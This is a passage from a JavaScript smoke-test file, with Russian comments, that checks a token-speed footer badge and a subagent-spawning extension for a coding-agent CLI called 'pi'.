		getAvailableProviderCount: () => 1,
		onBranchChange: () => () => {},
	};
	const renderFooter = () => {
		if (!footerFactory) throw new Error("setFooter не вызван");
		lastTheme = themeStub;
		return footerFactory(tuiStub, themeStub, footerDataStub).render(200);
	};

	await check("gen-speed: футер устанавливается и бейдж в строке токенов", async () => {
		const realNow = Date.now.bind(Date);
		let fake = 1_000_000;
		Date.now = () => fake;
		try {
			await piG.handlers.message_start({ message: { role: "assistant", usage: { output: 0 } } }, ctxG);
			fake += 300; // TTFT = 300ms
			await piG.handlers.message_update({ message: { role: "assistant", usage: { output: 100 } } }, ctxG);
			fake += 2700; // 3.0s суммарно
			await piG.handlers.message_end({ message: { role: "assistant", usage: { output: 100 }, stopReason: "stop" } }, ctxG);
		} finally {
			Date.now = realNow;
		}
		const lines = renderFooter();
		if (lines.length < 2) throw new Error("мало строк: " + JSON.stringify(lines));
		const stats = lines[1];
		if (!stats.includes("33t/s")) throw new Error("нет 33t/s: " + stats);
		if (!stats.includes("300ms")) throw new Error("нет TTFT: " + stats);
		if (stats.includes("⌀") || stats.includes(" · ")) throw new Error("лишние символы в бейдже: " + stats);
		if (!stats.includes("↑")) throw new Error("нет токенов ↑: " + stats);
		if (!stats.includes("24.0%/200k (auto)")) throw new Error("нет context%: " + stats);
		if (!stats.includes("test-model • medium")) throw new Error("нет модели справа: " + stats);
		if (lines[0] !== "[dim]~/Code/AGENTS/pi-extensions (master) • test-session") throw new Error("pwd-строка: " + lines[0]);
		// бейдж в строке токенов, а НЕ в строке статусов
		if (lines[2] && lines[2].includes("t/s")) throw new Error("бейдж дублируется в статус-строке: " + lines[2]);
		if (!lines[2] || !lines[2].includes("graft: ok")) throw new Error("статусы других расширений потеряны: " + JSON.stringify(lines));
	});

	await check("gen-speed: очень короткий ответ (<300ms) не двигает бейдж", async () => {
		const realNow = Date.now.bind(Date);
		let fake = 2_000_000;
		Date.now = () => fake;
		try {
			await piG.handlers.message_start({ message: { role: "assistant", usage: { output: 0 } } }, ctxG);
			fake += 200;
			await piG.handlers.message_end({ message: { role: "assistant", usage: { output: 5 }, stopReason: "stop" } }, ctxG);
		} finally {
			Date.now = realNow;
		}
		const stats = renderFooter()[1];
		if (!stats.includes("33t/s")) throw new Error("бейдж изменился: " + stats);
	});

	await check("gen-speed: aborted-ответ не двигает бейдж", async () => {
		const realNow = Date.now.bind(Date);
		let fake = 3_000_000;
		Date.now = () => fake;
		try {
			await piG.handlers.message_start({ message: { role: "assistant", usage: { output: 0 } } }, ctxG);
			fake += 3000;
			await piG.handlers.message_end({ message: { role: "assistant", usage: { output: 500 }, stopReason: "aborted" } }, ctxG);
		} finally {
			Date.now = realNow;
		}
		const stats = renderFooter()[1];
		if (!stats.includes("33t/s")) throw new Error("бейдж изменился: " + stats);
	});

	await check("gen-speed: ответ 700ms (быстрая модель) учитывается", async () => {
		const realNow = Date.now.bind(Date);
		let fake = 4_000_000;
		Date.now = () => fake;
		try {
			await piG.handlers.message_start({ message: { role: "assistant", usage: { output: 0 } } }, ctxG);
			fake += 100; // TTFT
			await piG.handlers.message_update({ message: { role: "assistant", usage: { output: 90 } } }, ctxG);
			fake += 600;
			await piG.handlers.message_end({ message: { role: "assistant", usage: { output: 90 }, stopReason: "stop" } }, ctxG);
		} finally {
			Date.now = realNow;
		}
		const stats = renderFooter()[1];
		// EMA от 33.3 и 128.6 (90 tok / 0.7s) с alpha 0.4 ≈ 71.4 → 71t/s
		if (!stats.includes("71t/s")) throw new Error("быстрый ответ не учтён: " + stats);
	});

	await check("gen-speed: session_start сбрасывает статистику и переустанавливает футер", async () => {
		footerFactory = null;
		await piG.handlers.session_start({ reason: "startup" }, ctxG);
		if (!footerFactory) throw new Error("футер не переустановлен");
		const lines = renderFooter();
		if (lines[1].includes("t/s")) throw new Error("бейдж не сброшен: " + lines[1]);
	});

	await check("gen-speed: в режиме print футер не устанавливается", async () => {
		const piP = makePi();
		genSpeed.default(piP);
		let called = false;
		const ctxP = { ...ctxG, mode: "print", hasUI: false, ui: { setFooter: () => { called = true; } } };
		await piP.handlers.message_start({ message: { role: "assistant", usage: { output: 0 } } }, ctxP);
		if (called) throw new Error("setFooter вызван в print-режиме");
	});
}

// === 9. subagents ===
{
	// child.ts читает env при загрузке модуля → свежий jiti без кэша на каждый режим
	const { createJiti: createJitiForChild } = await import("jiti");
	const jitiChild = (p) => createJitiForChild(import.meta.url, { cache: false })(p);

	const subagentsExt = jiti("../extensions/subagents/index.ts");
	const pi = makePi();
	pi.registerMessageRenderer = () => {};
	subagentsExt.default(pi);

	await check("subagents: 4 инструмента зарегистрированы", () => {
		for (const name of ["spawn_agent", "agents_list", "interrupt_agent", "resume_agent"]) {
			if (!pi.tools.find((t) => t.name === name)) throw new Error("нет " + name);
		}
	});
	await check("subagents: /spawn и флаг --subagents-disabled", () => {
		if (!pi.commands.some((c) => c.name === "spawn")) throw new Error("нет /spawn");
		if (!pi.flags.some((f) => f.name === "subagents-disabled")) throw new Error("нет флага");
	});
	await check("subagents: spawn без session_start -> 'not ready'", async () => {
		const tool = pi.tools.find((t) => t.name === "spawn_agent");
		const res = await tool.execute("id", { task: "x" }, new AbortController().signal, () => {}, noUiCtx);
		if (!String(res.content[0].text).includes("not ready")) throw new Error("не not-ready: " + res.content[0].text);
	});
	await check("subagents: child без child-env ничего не регистрирует", () => {
		delete process.env.PI_SUBAGENTS_CHILD_ID;
		const childExt = jitiChild("../extensions/subagents/child.ts");
		const piC = makePi();
		childExt.default(piC);
		if (piC.tools.length !== 0) throw new Error("инструменты в parent-режиме: " + piC.tools.map((t) => t.name).join(","));
	});
	await check("subagents: child с child-env регистрирует agent_done/agent_ping", async () => {
		// child.ts читает env при загрузке модуля, а jiti кэширует модуль в процессе
		// → проверяем в отдельном node-процессе
		const { spawnSync } = await import("node:child_process");
		const script = [
			"import { createJiti } from 'jiti';",
			"import { join } from 'node:path';",
			"process.env.PI_SUBAGENTS_CHILD_ID = 'smoke1';",
			"const root = process.cwd();",
			"const j = createJiti(join(root, 'package.json'), { cache: false });",
			"const m = j(join(root, 'extensions/subagents/child.ts'));",
			"const tools = [];",
			"m.default({ on(){}, registerTool:(d)=>tools.push(d.name) });",
			"if (!tools.includes('agent_done') || !tools.includes('agent_ping')) { console.error('missing: ' + tools.join(',')); process.exit(1); }",
			"console.log('ok');",
		].join("\n");
		const r = spawnSync("node", ["--input-type=module", "-e", script], { cwd: fileURLToPath(new URL("../", import.meta.url)), encoding: "utf8" });
		if (r.status !== 0) throw new Error((r.stderr || r.stdout).slice(0, 300));
	});
}

console.log(results.join("\n"));
const failed = results.filter((r) => r.startsWith("FAIL"));
process.exit(failed.length ? 1 : 0);
